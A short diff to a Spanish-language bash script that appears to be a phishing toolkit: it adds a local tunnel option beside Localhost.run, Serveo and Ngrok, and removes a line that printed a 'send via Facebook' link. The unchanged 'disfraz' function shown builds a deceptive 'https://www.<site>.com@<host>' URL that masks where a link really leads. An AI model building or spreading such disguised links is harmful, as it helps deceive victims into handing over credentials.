@@ -249,7 +249,9 @@ tunnel(){
         echo -e "$v[$b*$v]$b Selecciona el tunnel:\n"
         echo -e "$a[$b 1$v ] Localhost.run"
         echo -e "$a[$b 2$v ] Serveo"
-        echo -e "$a[$b 3$v ] Ngrok\n"
+        echo -e "$a[$b 3$v ] Ngrok"
+        echo -e "$a[$b 4$v ] Localhost\n"
+
         read -p $'\e[1;33m[\e[1;39m*\e[1;33m]\e[1;39m Elige una opción\e[0m > ' tunnel
         if [[ $tunnel == "1" || $tunnel == "01" ]];then
                 cd $ruta_carpeta
@@ -274,6 +276,15 @@ tunnel(){
                 clear_meta
                 menu_options
                 add_option
+
+        elif [[ $tunnel == "4" || $tunnel == "04" ]];then
+                cd $ruta_carpeta
+                tunnel2="localhost"
+                trap finish EXIT
+                clear_meta
+                menu_options
+                add_option
+
         else
                 echo -e "\n$r[*]$b Opción invalida: $tunnel\n"
                 sleep 0.5
@@ -521,7 +532,6 @@ disfraz(){
 	if [[ $clonada != "si" ]];then
         	namee=$(echo "$envialink" | cut -d "/" -f3)
         	pop9="https://www.$web.com@$namee"
-        	echo -e "$v[$b*$v]$b Envio por facebook:\e[0;32m " $pop9
 	fi
 }
 
